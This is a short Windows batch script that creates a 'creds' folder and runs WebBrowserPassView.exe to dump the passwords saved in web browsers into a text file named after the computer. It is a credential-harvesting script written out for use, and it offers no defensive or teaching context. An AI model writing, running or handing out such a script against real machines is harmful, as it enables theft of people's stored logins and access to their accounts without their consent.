@echo off

:: Creates a folder called creds only if the folder does not already exist.
mkdir creds

:: The command below runs WebBrowserPassView.exe and exports the results as text documents using the naming conventione WebBrowserPassView.exe-ComputerName
start WebBrowserPassView.exe /stext .\creds\WebBrowserPassView-%computername%.txt
-
